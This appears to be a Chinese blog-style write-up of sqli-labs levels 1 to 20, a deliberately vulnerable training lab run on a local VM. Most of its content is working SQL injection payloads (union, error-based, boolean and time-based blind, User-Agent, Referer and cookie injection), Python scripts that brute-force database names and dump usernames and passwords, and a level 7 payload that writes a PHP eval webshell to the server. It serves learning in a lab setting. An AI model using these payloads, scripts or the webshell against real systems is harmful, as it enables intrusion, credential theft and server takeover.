---
typora-copy-images-to: ../images
typora-root-url: ..
---



# sqli-labs writeup

刷刷sqli-labs ，学习下sql注入漏洞

环境是win10虚拟机, phpstudy搭建的

php版本:5.4.45

mysql版本:5.7.26



### less-1

单引号闭合

payload:

```
获取表名
?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
获取列名
?id=0' union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='users' --+
获取字段内容
?id=0' union select 1,2,group_concat(0x3a,username,0x3a,password) from users --+
```



### less-2

数字型注入,直接用union注入就可以了

payload:

```
获取表名
?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
获取列名
?id=0 union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='users'
获取字段内容
?id=0 union select 1,2,group_concat(0x3a,username,0x3a,password) from users 
```



### less-3

单引号加圆括号闭合

payload：

```
注入点探测：
?id=1') and 1=2 --+
获取列数量：
?id=1') order by 4 --+
获取表名：
?id=0') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
获取列名：
?id=0') union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='users' --+
获取数据：
?id=0') union select 1,2,group_concat(0x3a,username,0x3a,password) from users --+
```



### less-4

字符型注入，双引号加圆括号闭合

payload：

```
获取表名
?id=0") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+
获取列名
?id=0") union select 1,2,group_concat(column_name) from information_schema.columns where table_name = "users" --+
获取字段内容
?id=0") union select 1,2,group_concat(username,0x31,password) from users --+
```



### less-5

布尔盲注，需要注意闭合单引号

* 数据库名长度判断

  payload :

  ```
  ?id=0' or length(database())>7 --+
  ```

  脚本：

  ```python
  import requests
  def brute_len(url,payload):
      len = 0
      for i in range(0,10000):
          param = {"id":payload.format(str(i))}
          r = requests.get(url,param)
          if("You are in..........." not in r.text):
              print("len :  "+ str(i))
              len = i
              break
          else:
              continue
      return len
  
  url = "http://192.168.31.41/sqli/Less-5/"
  payload = "0\' or length(database()) > {0} #"
  brute_len(url,payload)
  ```

* 爆破数据库名

  这里用了两种方法，一种是遍历法，一种是二分法

  * 遍历法

    ```python
    import requests
    
    char_list = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&()*+,-./:;<=>?@[]^_{|}~"
    
    def bruteforce(url, payload, len):
        out = ''
        for i in range(1, len + 1):
            for c in char_list:
                id = payload.format(str(i), c)
                params = {"id": id}
                r = requests.get(url, params)
                if ("You are in..........." in r.text):
                    out += c
                    print(c, end="")
                    break
                else:
                    continue
        return out
    
    url = "http://192.168.31.41/sqli/Less-5/"
    
    payload = "0\' or substr(database(),{0},1) = '{1}' #"
    namelen = 8
    print("database name is: ", end="")
    database = bruteforce(url, payload, namelen)
    ```

  * 二分法

    ```python
    import requests
    def binary(url, payload, len):
        out = ''
        for i in range(1, len + 1):
            left = 0x1f
            right = 0x7f
            while 1:
                mid = left + (right - left)// 2
                if (mid == left):
                    print(chr(mid), end="")
                    out += chr(mid)
                    break
    
                s = payload.format(str(i), mid)
                params = {"id": s}
                r = requests.get(url, params)
                if ("You are in.........." in r.text):
                    right = mid
                else:
                    left = mid
                    
    url = "http://192.168.31.41/sqli/Less-5/"
    payload = "0\' or ascii(substr(database(),{0},1)) < {1} #"
    namelen = 8
    database = binary(url,payload,namelen)
    ```

* 获取表名长度

  脚本还是用之前爆破长度的脚本，这里只记录下payload

  ```python
  payload2 = "0\' or length((select group_concat(table_name,0x3a) from information_schema.tables where table_schema =database()))> {0} #"
  brute_len(url,payload2)
  ```

* 获取表名

  获取表名用的脚本是上面写的二分法和遍历法，两种都行，这里只记录payload，后面爆破列名和字段内容都一样，也只记录payload

  ```python
  payload3 = "0\' or ascii(substr((select group_concat(table_name,0x3a) from information_schema.tables where table_schema=database()),{0},1)) < {1} #"
  binary(url,payload3,33)
  ```

* 获取列名长度

  ```python
  payload4 = "0\' or length((select group_concat(column_name,0x3a) from information_schema.columns where table_name='users')) > {0} #"
  brute_len(url,payload4)
  ```

* 获取列名

  ```python
  payload5 = "0\' or ascii(substr((select group_concat(column_name,0x3a) from information_schema.columns where table_name='users'),{0},1)) < {1} #"
  binary(url,payload5,69)
  ```

* 获取字段内容长度

  ```python
  payload6 = "0\' or length((select group_concat(username,0x3a,password) from users)) > {0} #"
  brute_len(url,payload6)
  ```

* 获取字段内容

  ```python
  payload7 = "0\' or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) < {1} #"
  binary(url,payload7,188)
  ```

  

### less-6

这一关我用了两种做法，一个是布尔盲注，另一个是基于xpath语法的报错注入

* 基于xpath语法的报错注入

  payload:

  ```
  #获取数据库名
  ?id=1" union select updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
  #获取表名
  ?id=1" union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1)--+
  #获取列名
  ?id=1" union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users" ),0x7e),1)--+
  #获取字段内容 ,这里使用limit选择读取的内容，因为报错显示的消息长度有限
  ?id=1" union select updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e),1)--+
  ```

* 基于布尔盲注的注入

  ```python
  import requests
  
  def brute_len(url,payload):
      len = 0
      for i in range(1,100000):
          param = {"id":payload.format(str(i))}
          r = requests.get(url,param)
          if("You are in..........." not in r.text):
              print("len : " + str(i))
              len = i
              break
          else:
              continue
      return len
  
  def binary(url, payload, len):
      out = ''
      for i in range(1, len + 1):
          left = 0x1f
          right = 0x7f
          while 1:
              mid = left + (right - left)// 2
              if (mid == left):
                  print(chr(mid), end="")
                  out += chr(mid)
                  break
  
              s = payload.format(str(i), mid)
              params = {"id": s}
              r = requests.get(url, params)
              if ("You are in.........." in r.text):
                  right = mid
              else:
                  left = mid
  
  def get_payload(flag):
      if flag == "database_len":
          return "0\" or length(database())>{0} #"
      elif flag == "database_name":
          return "0\" or ascii(substr(database(),{0},1)) < {1} #"
      elif flag == "table_len":
          return "0\" or length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>{0} #"
      elif flag == "table_name":
          return "0\" or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) < {1} #"
      elif flag == "column_len":
          return "0\" or length((select group_concat(column_name) from information_schema.columns where table_name='users')) > {0} #"
      elif flag == "column_name":
          return "0\" or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1)) < {1} #"
      elif flag == "field_len":
          return "0\" or length((select group_concat(username,0x3a,password) from users))>{0} #"
      elif flag == "field_data":
          return "0\" or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) < {1} #"
  
  def exp():
      url = "http://192.168.31.41/sqli/Less-6/"
      #brute database name len
      payload1 = get_payload("database_len")
      print("brute database name ", end="")
      database_len = brute_len(url,payload1)
      payload2 = get_payload("database_name")
      database_name = binary(url,payload2,database_len)
      print("")
  
      payload3 = get_payload("table_len")
      print("brute table ",end="")
      table_len = brute_len(url,payload3)
      payload4 = get_payload("table_name")
      table_name = binary(url,payload4,table_len)
      print("")
  
      payload5 = get_payload("column_len")
      print("brute clomun ",end="")
      column_len = brute_len(url,payload5)
      payload6 = get_payload("column_name")
      column_name = binary(url,payload6,column_len)
      print("")
  
      payload7 = get_payload("field_len")
      print("brute field ",end="")
      field_len = brute_len(url,payload7)
      payload8 = get_payload("field_data")
      field_data = binary(url,payload8,field_len)
  ```



### less-7

这关是要闭合单引号加上两个圆括号，这一关提示是dump into outfile

所以可以利用into outfile函数将webshell写入服务器中，不过要知道写入文件的绝对路径，这就有点难了

我是用phpstduy在windows搭的环境

所以路径为： "c:\\phpstudy_pro\\www"

在写入webshell后通过蚁剑进行连接

这题还可以有另一种做法，就是布尔盲注，它页面的信息可以判断true或者false

* dump into file做法

  ```
  ?id=1')) union select '<?php @eval($_POST["admin"]) ?>\' into outfile \"c:\\phpstudy_pro\\www\\test.php\"  --+
  ```

  通过蚁剑连接webshell

  ![image-20210617172009091](/images/image-20210617172009091.png)

* 布尔盲注的做法和less-6一样，就不写了



### less-8

布尔盲注，需要闭合单引号

这一题拿less-6的脚本，将payload改一下就能用

payload

```python
url = "http://192.168.31.41/sqli/Less-8"
payload = "0\' or length(database()) > {0} #"
database_len = brute_len(url,payload)
payload1 = "0\' or ascii(substr(database(),{0},1)) < {1} #"
binary(url,payload1,database_len)

payload2 = "0\' or length((select group_concat(table_name) from information_schema.tables where table_schema=database())) >{0} #"
table_len = brute_len(url,payload2)
payload3 = "0\' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) < {1} #"
binary(url,payload3,table_len)

payload4 = "0\' or length((select group_concat(column_name) from information_schema.columns where table_name=\'users\')) >{0} #"
column_len = brute_len(url,payload4)
payload5 = "0\' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'users\'),{0},1)) < {1} #"
binary(url,payload5,column_len)

payload6 = "0\' or length((select group_concat(username,0x3a,password) from users)) >{0} #"
field_len = brute_len(url,payload6)
payload7 = "0\' or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) < {1} #"
binary(url,payload7,field_len)
```





### less-9

时间盲注，需要闭合单引号

时间盲注的做法和布尔盲注的类似，不过用于判断sql语句是否执行是通过请求页面的响应时间来判断，而布尔盲注是通过页面显示的ture或者false来判断。

时间盲注用到了sleep()函数，这个函数用于执行延时操作

基本payload如下：

> ?id=1' and if(len(databse()) > 2, 0 , sleep(4)) #

这里的if语句如果条件为false，就会执行sleep(4)，然后通过判断页面的响应时间就可以知道if语句为真还是假

这里判断页面延时可以通过burpsutie来发送请求

![image-20210617205747543](/images/image-20210617205747543.png)



脚本的编写和盲注的也类似，这里就不爆破长度了，没有必要，浪费时间，直接爆破字段值

exp：

```python
import requests


def traverse(url,payload):
    out=''
    char_list = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&()*+,-./:;<=>?@[]^_{|}~"
    for i in range(1,1000000):
        for c in char_list:
            id = payload.format(str(i),c)
            param = {"id": id}
            try:
                r = requests.get(url, param, timeout=3)
                if r.text != "":
                    continue
            except:
                print(c,end="")
                out += c
                break

    return out

url = "http://192.168.31.41/sqli/Less-9"

#brute database name
payload1 = "1\' and if((substr(database(),{0},1)= \"{1}\"),sleep(5),0) #"
#brute table name
payload2 = "1\' and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)=\"{1}\"),sleep(3),0) #"
#brute column name
payload3 = "1\' and if((substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1)=\"{1}\"),sleep(3),0) #"
#brute field data
payload4 = "1\' and if((substr((select group_concat(username,0x3a,password) from users),{0},1)=\"{1}\"),sleep(3),0) #"
traverse(url,payload1)
```





### less-10

还是时间盲注，和less-9类似，不过这一关是要闭合双引号

还有判断响应时间最好还是用burpsuite来看

payload：

```python
payload1= "1\" and if((substr(database(),{0},1)= \"{1}\"),sleep(5),0) #"
payload2= "1\" and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)=\"{1}\"),sleep(3),0) #"
payload3= "1\" and if((substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1)=\"{1}\"),sleep(3),0) #"
payload4 = "1\" and if((substr((select group_concat(username,0x3a,password) from users),{0},1)=\"{1}\"),sleep(3),0) #"
```



### less-11

这一关是基于POST的注入，有报错信息回显，要闭合单引号

判断注入点：

```
uname=admin'&passwd=test&submit=Submit
```

payload: (POST数据)

```
#get database name
uname=admin&passwd=test' union select 1,database()#&submit=Submit
#get table name
uname=admin&passwd=test' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&submit=Submit
#get column name
uname=admin&passwd=test' union select 1,group_concat(column_name) from information_schema.columns where table_name="users"#&submit=Submit
#get field data
uname=admin&passwd=test' union select 1,group_concat(username,0x3a,password) from users#&submit=Submit
```



### less-12

基于POST的注入，有报错信息回显，要闭合双引号加一个圆括号

判断注入点：

```
uname=admin"&passwd=test&submit=Submit
```

payload:

```
#get database name
uname=admin&passwd=test") union select 1,database()#&submit=Submit
#get table name
uname=admin&passwd=test") union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&submit=Submit
#get column name
uname=admin&passwd=test") union select 1,group_concat(column_name) from information_schema.columns where table_name="users"#&submit=Submit
#get field data
uname=admin&passwd=test") union select 1,group_concat(username,0x3a,password) from users#&submit=Submit
```



### less-13

基于POST的布尔盲注，通过图片判断是否登录成功

判断注入点：

```
uname=admin'
```

根据报错信息还需要闭合一个圆括号

exp:

```python
import requests

def binary_brute(url,payload):
    for i in range(1,10000):
        left = 0x1f
        right= 0x7f

        while 1:
            mid = left + (right - left)//2
            if(mid == left):
                print(chr(mid),end="")
                break

            uname = payload.format(str(i),str(mid))
            param = {"uname":uname,"passwd":"123","submit":"Submit"}
            r=requests.post(url,param)
            if("flag.jpg" in r.text):
                right = mid
            else:
                left = mid

url = "http://192.168.31.41/sqli/Less-13/"
#brute database name
# payload1 = "test') or ascii(substr(database(),{0},1)) < {1} #"
# binary_brute(url,payload1)

#brute table name
# payload2 = "test') or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) < {1} #"
# binary_brute(url,payload2)

#brute column name
# payload3 = "test') or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),{0},1)) < {1} #"
# binary_brute(url,payload3)

#brute field data
payload4 = "test') or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) < {1} #"
binary_brute(url,payload4)
```



### less-14

这题和13关类似，都是可以用基于布尔的盲注来做，它需要闭合双引号

注入点探测：

```
uname=admin"
```

payload:

```python
#brute database name
payload1 = "test\" or ascii(substr(database(),{0},1)) < {1} #"

#brute table name
payload2 = "test\" or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) < {1} #"
#brute column name

payload3 = "test\" or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),{0},1)) < {1} #"

#brute field data
payload4 = "test\" or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) < {1} #"
```



### less-15

这一关没有报错信息，只能知道是否登录成功，所以可以通过布尔盲注来做。当然，通过时间盲注也是可以的

注入点探测：

```
uname=admin'
uname=admin'#
```

布尔盲注的exp:

```python
import requests

def binary_brute(url,payload):
    for i in range(1,10000):
        left = 0x1f
        right= 0x7f

        while 1:
            mid = left + (right - left)//2
            if(mid == left):
                print(chr(mid),end="")
                break

            uname = payload.format(str(i),str(mid))
            param = {"uname":uname,"passwd":"123","submit":"Submit"}
            r=requests.post(url,param)
            if("flag.jpg" in r.text):
                right = mid
            else:
                left = mid

url = "http://192.168.31.41/sqli/Less-15/"
#brute database name
# payload1 = "test' or ascii(substr(database(),{0},1)) < {1} #"
# binary_brute(url,payload1)

#brute table name
# payload2 = "test' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) < {1} #"
# binary_brute(url,payload2)

# #brute column name
# payload3 = "test' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),{0},1)) < {1} #"
# binary_brute(url,payload3)

# #brute field data
payload4 = "test' or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) < {1} #"
binary_brute(url,payload4)
```



时间盲注的exp:

```python
import requests
def traverse(url,payload):
    for i in range(1,1000):
        for c in range(0x1f,0x80):
            uname = payload.format(str(i),str(c))
            #print(uname)
            params = {"uname":uname,"passwd":"123","submit":"Submit"}
            try:
                r = requests.post(url,params,timeout=2)
                if(r.text != ""):
                    continue
            except:
                print(chr(c),end="")
                break

url = "http://192.168.31.41/sqli/Less-15/"
#brute database  name
# payload1 = "test' or if((ascii(substr(database(),{0},1))={1}),sleep(2),1) #"
# traverse(url,payload1)

#brute table name
# payload2 = "test' or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1}),sleep(2),1) #"
# traverse(url,payload2)

#brute column name
# payload3 = "test' or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),{0},1))={1}),sleep(2),1) #"
# traverse(url,payload3)

#brute field data
payload4 = "test' or if((ascii(substr((select  group_concat(username,0x3a,password) from users),{0},1))={1}),sleep(2),0) #"
traverse(url,payload4)
```



### less-16

这一关和less-15关类似，同样可以通过布尔盲注或者时间盲注来做，它要闭合双引号加一个圆括号

注入点探测：

```
uname=admin"#&passwd=&submit=Submit
uname=admin")#&passwd=&submit=Submit
uname=admin")#&passwd=&submit=Submit
```

脚本就用less-15的，下面贴下payload

布尔盲注payload:

```python
#brute database name
# payload1 = "test\") or ascii(substr(database(),{0},1)) < {1} #"
# binary_brute(url,payload1)

#brute table name
# payload2 = "test\") or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)) < {1} #"
# binary_brute(url,payload2)

# #brute column name
# payload3 = "test\") or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),{0},1)) < {1} #"
# binary_brute(url,payload3)

# #brute field data
payload4 = "test\") or ascii(substr((select group_concat(username,0x3a,password) from users),{0},1)) < {1} #"
binary_brute(url,payload4)
```

时间盲注的payload:

```python
#brute database  name
# payload1 = "test\") or if((ascii(substr(database(),{0},1))={1}),sleep(2),1) #"
# traverse(url,payload1)

#brute table name
# payload2 = "test\") or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1}),sleep(2),1) #"
# traverse(url,payload2)

#brute column name
# payload3 = "test\") or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),{0},1))={1}),sleep(2),1) #"
# traverse(url,payload3)

#brute field data
payload4 = "test\") or if((ascii(substr((select  group_concat(username,0x3a,password) from users),{0},1))={1}),sleep(2),0) #"
traverse(url,payload4)
```



### less-17

这一关是针对update语句的注入，有报错信息回显，所以可以进行报错注入

一般update语句如下:

```sql
update users set password='$p' where username='admin'
```

注入点探测：

```
uname=admin&passwd=1' &submit=Submit
uname=admin&passwd=1' #&submit=Submit
```

payload：

```
#get databsae name
uname=admin&passwd=1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) #
#get table name
uname=admin&uname=admin&uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
#get column name
uname=admin&uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where uname=admin&uname=admin&table_name="users"),0x7e),1) #
#get field data
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select * from ((select group_concat(username,0x3a,password) from security.users limit 0,1)) as a),0x7e),1) #
```

这里获取users表的数据时要将结果再通过一个中间表多select的形式，不然会出现下面这个错误

> You can’t specify target table for update in FROM clause 

这个错误的意思是不能在同一个SQL语句中，先select某些表中的语句值然后再update它。所以这select不能直接获取users表的内容，而是通过中间表再来select一次，这里要注意给中间表一个别名，不然会报错



这里再记录一下使用extractvalue函数的报错注入

payload:

```
#get database name
uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
#get table name
uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #
#get column name
uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e)) #
#get field data
uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) as a),0x7e)) #
```





### less-18

这一关是header头注入，User Agent头存在注入漏洞。这一关先要uname和passwd都正确后才会执行对User Agent的操作。uname和passwd都不能注入，他进行了严格的过滤。查看下他过滤的代码：

```php
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,20);
		}

		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())
			{
			$value = stripslashes($value);
			}

		// Quote if not a number
		if (!ctype_digit($value))
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
	}
$uname = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']);
```

get_magic_quotes_gpc函数的作用是获取php.ini中的magic_quotes_gpc的值。

> 当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1
>
> 当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0
>
> 如果magic_quotes_gpc=On，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”。

stripslashes函数用于去除字符串中的反斜杠`\`

mysql_real_escape_string() 函数会转义 SQL 语句中使用的字符串中的特殊字符, 以下字符会受到影响:

- \x00
- \n
- \r
- \
- '
- "
- \x1a

所以uname和passwd参数不能被注入

再看下User Agent被用于的mysql操作

```php
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
$result1 = mysql_query($sql);
$row1 = mysql_fetch_array($result1);
	if($row1)
		{
		echo '<font color= "#FFFF00" font size = 3 >';
		$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
		mysql_query($insert);
		//echo 'Your IP ADDRESS is: ' .$IP;
		echo "</font>";
		//echo "<br>";
		echo '<font color= "#0000ff" font size = 3 >';			
		echo 'Your User Agent is: ' .$uagent;
		echo "</font>";
		echo "<br>";
		print_r(mysql_error());			
		echo "<br><br>";
		echo '<img src="../images/flag.jpg"  />';
		echo "<br>";
		
		}
	else
		{
		echo '<font color= "#0000ff" font size="3">';
		//echo "Try again looser";
		print_r(mysql_error());
		echo "</br>";			
		echo "</br>";
		echo '<img src="../images/slap.jpg"   />';	
		echo "</font>";  
		}
}
```

它被用于insert语句中插入数据库，所以可以通过报错注入来获得数据库的内容

一般insert语句如下：

```
insert into users (username, password) values ('$username','Olivia');
```

要进行的注入的话就要闭合单引号，构造payload如下：

```
username = "1' or updatexml(1,database(),1) or'"
#最终SQL语句如下
insert into users (username, password) values ('1' or updatexml(1,database(),1) or'','test');
```

在这一关中注入点是User Agent，我通过burpsuite来抓包修改

判断注入点：

![image-20210619151528843](/images/image-20210619151528843.png)

payload:

```
#get database name
User-Agent: 0' or updatexml(1,concat(0x7e,(database())),0) or'
#get table name
User-Agent: 0' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) or'
#get column name
User-Agent: 0' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e),0) or'
#get field data
User-Agent: 0' or updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),0) or'
```



### less-19

这一关是Refer头注入，登录成功后会将Refer头显示在网页上，并且会有报错回显

通过burpsuite抓包修改Refer头

注入点探测：

```
Referer: ' 
Referer: ' or 1=1 or '
```

payload：

```
#get database name
Referer: ' or updatexml(1,concat(0x7e,database(),0x7e),1) or'
#get table name
Referer:' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) or'
#get column name
Referer:' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e),0) or'
#get field data
Referer:' or updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),0) or'
```



### less-20

这一关是cookie注入，通过admind登录后可以发现cookie的值是从uname中的到的。通过burpsuite抓包修改cookie进行测试

注入点探测：

```
Cookie: uname=admin'
Cookie: uname=admin'#
```

payload:

```
#database name
Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) #
#table name
Cookie: uname=admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
#column name
Cookie: uname=admin' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name="users"),1,10),0x7e),1) #
#field data
Cookie: uname=admin' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1) #
```

